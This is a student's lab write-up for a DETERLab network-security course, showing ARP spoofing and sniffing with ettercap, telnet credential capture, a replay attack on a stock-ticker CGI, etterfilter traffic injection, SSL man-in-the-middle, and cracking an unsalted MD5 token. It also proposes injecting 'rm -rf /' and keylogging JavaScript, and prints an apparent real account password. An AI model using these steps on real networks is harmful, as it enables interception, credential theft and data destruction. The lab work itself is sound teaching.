# Lab 4

## SSH

Login to DETERLab as an user:

```bash
ssh la136cr@users.deterlab.net
```

The password is: `kKpM8Mki!FPkig!`

Then you can ssh to `eve` experiment instance:

```bash
ssh eve.la136cr-lab4.UCLA136.isi.deterlab.net
```

The experiement instances are configured as such that `alice` (`10.1.1.2`), `bob` (`10.1.1.3`), and `eve` (`10.1.1.4`) share the same LAN `lan0`.

## 1. Eavesdropping

We will use `ettercap` to perform ARP spoofing. First, execute `ifconfig` and identify the interface on the `10.x.x.x` network.

```
la136cr@eve:~$ ifconfig
eth3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.1.4  netmask 255.255.255.0  broadcast 10.1.1.255
        inet6 fe80::204:23ff:fec7:a5c7  prefixlen 64  scopeid 0x20<link>
        ether 00:04:23:c7:a5:c7  txqueuelen 1000  (Ethernet)
        RX packets 19  bytes 4662 (4.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26  bytes 4372 (4.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth4: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.201  netmask 255.255.252.0  broadcast 192.168.3.255
        inet6 fe80::214:22ff:fe23:8afa  prefixlen 64  scopeid 0x20<link>
        ether 00:14:22:23:8a:fa  txqueuelen 1000  (Ethernet)
        RX packets 52952  bytes 78670814 (78.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5608  bytes 542207 (542.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 498  bytes 52170 (52.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 498  bytes 52170 (52.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

The interface of local network is `eth3`. Now execute `sudo su -` because `ettercap` must be run as root in order to function properly.

```bash
sudo su -
```

Start `ettercap`. You can press tab key to change windows.

```bash
ettercap -C -i eth3
```

Choose `Unified Sniffing` from the `Sniff` menu. Then scan the hosts on the network from `Hosts` menu. Open hosts list. Press `1` to add `alice` to target 1, then press `2` to add host `bob` to target 2. Spoof their ARP tables under `Mitm` menu. Finally begin sniffing the network under `Start` menu.

Now, open up another terminal and use `tcpdump` to sniff and analyze network traffic:

```bash
tcpdump -i eth3 -s0 -w output.pcap
```

Then use `chaosreader` to inspect and analyze `tcpdump` captures:

```bash
chaosreader output.pcap
```

Use `scp -r` to copy all the files (including `index.html`) to your laptop and open it in your browser to start analzing the traffic.

**1. What kind of data is being transmitted in cleartext? What ports, what protocols? Can you extract identify any meaningful information from the data? e.g., if a telnet session is active, what is happening in the sesion? If a file is being transferred, can you identify the data in the file? Make sure you eavesdrop for at least 30 seconds to make sure you get a representative sample of the communication.**

There are 3 different types of data being transmitted in cleartest.

The first type of data is a HTTP communication between `10.1.1.3:60822` and `10.1.1.2:80` where `bob` is making a GET request to `alice` for the resource `/cgi-bin/access1.cgi?line=3009`.

```
...Morpheus, don't --
```

(the content differs based on the query parameters)

The second type of data is also a HTTP communication between `10.1.1.2:59980` and `10.1.1.3:80` where `alice` is making a GET request to `bob` for the resource `/cgi-bin/stock.cgi?symbol=B1FF&new=94&hash=a69d080eebcff2f005e9f6de413375ee`.

```
<!DOCTYPE html
.PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
. "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
</head>
<body>
<h4>Got symbol: 'B1FF'</h4><h4>Adding new figure: '94'</h4><h1>Data accepted.&
>lt;/h1><h2><a href='/cgi-bin/stock.cgi'>Reload</a></h2>
</body>
</html>
```

(the content differs based on the query parameters)

Sometimes there is no query parameters (i.e. `/cgi-bin/stock.cgi`), in which case the content is:

```
<!DOCTYPE html
.PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
. "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
</head>
<body>
...
<table border='1' height='200'><tr>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='100' w
>idth='50'><tr><td><p align='center'>$50</p></td></tr></table>&l
>t;/td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='198' w
>idth='50'><tr><td><p align='center'>$99</p></td></tr></table>&l
>t;/td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='160' w
>idth='50'>' valign='bottom' height='76' width='50'><tr><td><p align='center'>$38</p></td
>></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='184' w
>idth='50'><tr><td><p align='center'>$92</p></td></tr></table>&l
>t;/td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='188' w
>idth='50'><tr><td><p align='center'>$94</p></td></tr></table>&l
>t;/td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='64' wi
>dth='50'><tr><td><p align='center'>$32</p></td></tr></table><
>;/td>
</tr></table>
</td></tr></table>
<hr />
</body>
</html>
```

The third type of data is telnet communication between `10.1.1.3:55580` and `10.1.1.2:23` where `bob` is performing remote login into `alice`.

```
alice.la136cr-lab4.ucla136.isi.deterlab.net login: jumbo
jumbo
jumbo
jumbo
Password: Password: donald78
```

(there are 2 other different users)

**2. Is any authentication information being sent over the wire? e.g., usernames and passwords. If so, what are they? What usernames and passwords can you discover? Note: the username and password decoding in ettercap is not perfect -- how else could you view plain text authentication?**

Yes, there are 3 username/password pairs found in the telnet communication.

| username | password |
| -------- | -------- |
| jumbo    | donald78 |
| jimbo    | goofy76  |
| jambo    | minnie77 |

**3. Is any communication encrypted? What ports?**

Yes, there is a HTTPS communication between `10.1.1.3:33472` and `10.1.1.2:443` where `bob` is making a request to `alice`.

## 2. Replay Attack against the Stock Ticker

From previous section, we know `bob` is the server who hosts stock information at port 80. Setup SSH tunneing so that we can access the page with browser locally.

```bash
ssh -L 8080:pc203:80 la136cr@users.deterlab.net
```

Also from previous section, if you look at `httplog.txt` generated by `chaosreader`, we can see all the HTTP requests made within the network. In particular, we are interested in the requests for the resource `/cgi-bin/stock.cgi?symbol=(FZCO|ZBOR)`.

```bash
$ cat httplog.txt | grep "/cgi-bin/stock.cgi?symbol=\(FZCO\|ZBOR\)"
22   22:09:16 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=FZCO&new=72&hash=d2c2093cbb0bb90592302f0116c13e98
22   22:09:16 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=FZCO&new=72&hash=d2c2093cbb0bb90592302f0116c13e98
29   22:09:22 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=ZBOR&new=70&hash=6945868f75240f4603907054619897f3
29   22:09:22 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=ZBOR&new=70&hash=6945868f75240f4603907054619897f3
59   22:09:59 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=FZCO&new=0&hash=2e372aa09638bdc9dc123662682a48c5
59   22:09:59 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=FZCO&new=0&hash=2e372aa09638bdc9dc123662682a48c5
63   22:10:02 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=ZBOR&new=24&hash=64186090b8c5011d10e33c82c6d75295
63   22:10:02 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=ZBOR&new=24&hash=64186090b8c5011d10e33c82c6d75295
110  22:10:58 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=ZBOR&new=39&hash=86c62ddc4b13bf928b1f106b4b8998e7
110  22:10:58 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=ZBOR&new=39&hash=86c62ddc4b13bf928b1f106b4b8998e7
121  22:11:11 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=ZBOR&new=28&hash=5edafb90d4bba4c7f4be70fcb2252402
121  22:11:11 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=ZBOR&new=28&hash=5edafb90d4bba4c7f4be70fcb2252402
134  22:11:22 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=FZCO&new=40&hash=9b6e6d48246e5e3cf5226e62e2c2edc7
134  22:11:22 GET http://10.1.1.3/cgi-bin/stock.cgi?symbol=FZCO&new=40&hash=9b6e6d48246e5e3cf5226e62e2c2edc7
```

Looking at the output, you will notice that two requests with the same `symbol` and `new` have the same `hash`. So you would guess `hash` is computed solely based on `symbol` and `new`.

Execute following commands many times.

```bash
curl "http://10.1.1.3/cgi-bin/stock.cgi?symbol=FZCO&new=40&hash=9b6e6d48246e5e3cf5226e62e2c2edc7"
curl "http://10.1.1.3/cgi-bin/stock.cgi?symbol=ZBOR&new=70&hash=6945868f75240f4603907054619897f3"
```

Now, go to `localhost:8080/cgi-bin/stock.cgi` on your browser and you will see:

![replay attack](replay-attack.png)

**1. Explain exactly how to execute the attack, including the specific RPCs you replayed.**

See above.

**2. Explain how you determined that this strategy would work.**

See above.

**3. Execute your replay attack and show the results of your attack with a screen capture, text dump, etc. showing that you are controlling the prices on the stock ticker.**

See above.

## 3. Insertion Attack

First, write your filter scripts `symbol.filter` and `price.filter`. Then compile them:

```bash
etterfilter symbol.filter -o symbol.ef
etterfilter price.filter -o price.ef
```

Now we want to perform ARP poision on `eth3` and run the filter.

```bash
ettercap -T -q -F symbol.ef -M ARP /10.1.1.2,10.1.1.3//
```

Let's check if the filter is working. Open a new tab and ssh into `alice`.

```
ssh alice.la136cr-lab4.UCLA136.isi.deterlab.net
```

Request the stock information:

```bash
$ curl http://10.1.1.3/cgi-bin/stock.cgi
...
<h1>A Real Stock Exchange</h1><hr /><h2>FrobozzCo International (OWND)</h2>
...
```

Looks like symbol filter is working as expected. Similarly, let's check if price filter would work.

```bash
ettercap -T -q -F price.ef -M ARP /10.1.1.2,10.1.1.3//
```

Request the stock information:

```bash
$ curl http://10.1.1.3/cgi-bin/stock.cgi
...
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='14' width='50'><tr><td><p align='center'>$9</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='158' width='50'><tr><td><p align='center'>$99</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='4' width='50'><tr><td><p align='center'>$9</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='10' width='50'><tr><td><p align='center'>$9</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='136' width='50'><tr><td><p align='center'>$98</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='114' width='50'><tr><td><p align='center'>$97</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='154' width='50'><tr><td><p align='center'>$97</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='122' width='50'><tr><td><p align='center'>$91</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='162' width='50'><tr><td><p align='center'>$91</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='138' width='50'><tr><td><p align='center'>$99</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='48' width='50'><tr><td><p align='center'>$94</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='188' width='50'><tr><td><p align='center'>$94</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='194' width='50'><tr><td><p align='center'>$97</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='140' width='50'><tr><td><p align='center'>$90</p></td></tr></table></td>
<td valign='bottom'><table border='1' bgcolor='#aa0000' align='left' valign='bottom' height='16' width='50'><tr><td><p align='center'>$9</p></td></tr></table></td>
...
```

It looks like the price filter is also working as expected!

**1. Given the power of etterfilter and the kinds of traffic on this network, you can actually make significant changes to a machine or machines that you're not even logged in to. How?**

From first exploit, we saw that `bob` was remotely logging into `alice` through telnet, which is a cleartext protocol. Then `bob` was sending some commands such as `cd` and `ls`. We could use `etterfilter` to replace such commands with malicious ones like `sudo su -; rm -rf /;` to make delete all the files in `alice`.

**2. Of the cleartext protocols in use, can you perform any other dirty tricks using insertion attacks? The more nasty and clever they are, the better.**

We can do some dirtier and more clever trick with HTTP exploit. For example, we can replace the `href` of an anchor tag to redirect the user to a malicious website. Or we can also inject a malicious javascript that, for example, monitor user keystrokes and send them to the hacker. The hope is to steal username and password from the keystrokes.

## 4. MITM vs. Encryption

Reference: https://samiux.blogspot.com/2011/05/howto-sniffing-ssl-with-ettercap-on.html

`ettercap` supports MITM attacks against SSL encryption, but you need to modify `ettercap`'s configuration file located at `/etc/ettercap/etter.conf` to enable it.

```bash
vim /etc/ettercap/etter.conf
```

Make changes as follows:

```
...
[privs]
ec_uid = 0    # nobody is the default
ec_gid = 0    # nobody is the default
...
# if you use iptables:
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
...
```

Start `ettercap` as we did previously.

```bash
ettercap -C -i eth3
```

After the exploit is done, check live connections under `View`. Select some connections with port 443 (standard HTTPS port) to check the data communicated.

### Connection 1

`10.1.1.3:55748`:

```
GET /cgi-bin/access2.cgi?line=3534 HTTP/1.1
Host: alice-lan0
User-Agent: curl/7.58.0
Accept: */*
```

`10.1.1.2:443`:

```
HTTP/1.1 200 OK
Date: Thu, 11 Feb 2021 01:46:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Transfer-Encoding: chunked
Content-Type: text/html

30
        The door is disappearing, dissolving

0
```

### Connection 2

`10.1.1.3:56492`:

```
GET /cgi-bin/access2.cgi?line=554 HTTP/1.1
Host: alice-lan0
User-Agent: curl/7.58.0
Accept: */*
```

`10.1.1.2:443`:

```
HTTP/1.1 200 OK
Date: Thu, 11 Feb 2021 01:56:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Transfer-Encoding: chunked
Content-Type: text/html

37
        He pushes his chair back, leaves his office.

0
```

We have successfully view the HTTPS data communicated between `alice` and `bob`.

**1. What configuration elements did you have to change?**

See above.

**2. Copy and paste some of this data into a text file and include it in your submission materials.**

See above.

**3. Why doesn't it work to use tcpdump to capture this "decrypted" data?**

Because the HTTPS communication between `alice` and `bob` **is** encrypted, and `tcpdump` does not know how to decrypt it. The data look like they are decrypted because `ettercap` knows how to decrypt the message. `ettercap` knows how to decrypt the message because it substitutes the real ssl certificaite with its own fake certificate. So `alice` thinks it's communicating with `bob` while in fact it is communicating with `eve`. Similarly, `bob` thinks it's communicating with `alice` while in fact it is communicating with `eve`. They exchange the keys. So `ettercap` knows how to decrypt the communication.

**4. For this exploit to work, it is necessary for users to blindly "click OK" without investigating the certificate issues. Why is this necessary?**

In order to start the communication, the `bob` needs to check the certificate to verify that the data is indeed from `alice`. Since the data is actually coming from `eve` in this exploit, `bob` will see a certificate that it has never seen, and will be prompted to verify the validity of the certificate. We need `bob` to "click OK" to make it communicate with `eve`.

**5. What is the encrypted data they're hiding?**

Googling "The door is disappearing, dissolving He pushes his chair back, leaves his office." leads to https://sfy.ru/?script=tron_1982. It looks like the data is the script of the movie Tron (1982) by Steven Lisberger and Bonnie MacBird.

## Extra Credit

**1. What observable software behavior might lead you to believe this?**

As written in part 2 of the exploit, we see two requests with the same `symbol` and `new` have the same `hash`. So we would guess `hash` is computed solely based on `symbol` and `new`, and thus the encryption token (i.e. hash) used in the stock ticker application is not particularly strong.

**2. Can you reverse engineer the token? How is the token created?**

| symbol | new | hash                             |
| ------ | --- | -------------------------------- |
| FZCO   | 40  | 9b6e6d48246e5e3cf5226e62e2c2edc7 |
| ZBOR   | 70  | 6945868f75240f4603907054619897f3 |

Two hopes. One hope is that the input for the hash function is simple. Some candidates for the hash input:

1. "${symbol}${new}" (concatenation)
2. "${new}${symbol}" (concatenation)
3. "${symbol} ${new}" (space)
4. ...

Another hope is that the hash function well known like MD5 and SHA.

Go to https://emn178.github.io/online-tools/md5.html to try out various inputs and hash functions.

After playing around for a while, you will find that the input is a simple concatenation (i.e. "${symbol}${new}") and the hash function is MD5.

**3. If you can reverse engineer it, can you write a script in your favorite language to post data of your choice? Hint: all the necessary pieces are available on the servers for both Perl and bash.**

See `price.sh`. Execute it inside `eve`. Remember to setup a SSH tunnel with `bob` to verify that it works.

```bash
ssh -L 8080:pc203:80 la136cr@users.deterlab.net
```

**4. What would be a better token? How would you implement it on both the client and server side?**

We can create a better token by appending a salt at the end of the input. So instead of `${symbol}${new}`, we do `${symbol}${new}${secret}`, where `${secret}` is the salt.

Now the token is harder to crack. But there is one problem: The attacker can still tell that the hash is based on `symbol` and `new` because the hashes will be the same for the same pair of `symbol` and `new`.

To make the token even better, we can make the hash to be the concatenation of `hash("${symbol}${new}${secret}")` and `hash("${current symbol price}${new}")`. This will produce a hash of length 32 + 32 = 64.

On the server side, we split the hash in half. First, we check if the first half of the hash matches. Then, we check if the second half of the hash matches.

Now the hash won't be the same for the same pair of `symbol` and `new` unless the the pair of previous symbol price and current symbol price is the same.
